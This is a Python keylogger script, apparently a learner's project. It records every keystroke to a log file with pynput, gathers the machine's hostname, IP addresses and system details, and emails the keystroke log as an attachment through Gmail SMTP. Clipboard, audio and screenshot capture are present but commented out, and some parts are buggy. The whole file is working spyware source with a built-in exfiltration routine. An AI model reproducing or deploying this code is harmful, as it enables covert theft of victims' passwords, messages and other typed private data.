# librairies

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from ipaddress import ip_address
import smtplib
import socket
import platform
#import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
# from scipy.io.wavfile import write
# import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from multiprocessing import Process, freeze_support
#from PIL import ImageGrab
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
key_infos = "key_log.txt"
email_address = ""
password = ""
toaddr = ""
# file info
file_path = "/home/anderson/learnPython"
extend = "/"

# function send email


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "log file"
    body = "Body of mail"

    msg.attach(MIMEText(body, "plain"))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


send_email(key_infos, file_path + extend + key_infos, toaddr)

# function info system


def computer_info():
    with open(file_path + extend + system_info, 'a') as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipifys.org").text
            f.write("Public IP Adress:" + public_ip)
        except Exception:
            
            f.write("adresse public introuvable \n")
            f.write("")
            f.write("Processor:" + (platform.processor())+'\n')
            f.write("system:" + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Privé: " + ip_addr + "\n")

computer_info()

"""
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.openCli
        except e:"""
        
count = 0
keys = []


def on_press(key):
    global keys, count
    # print(key)
    keys.append(key)
    count += 1

    if count >= 0:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + key_infos, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\t")
                f.close()
            elif k.find("key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
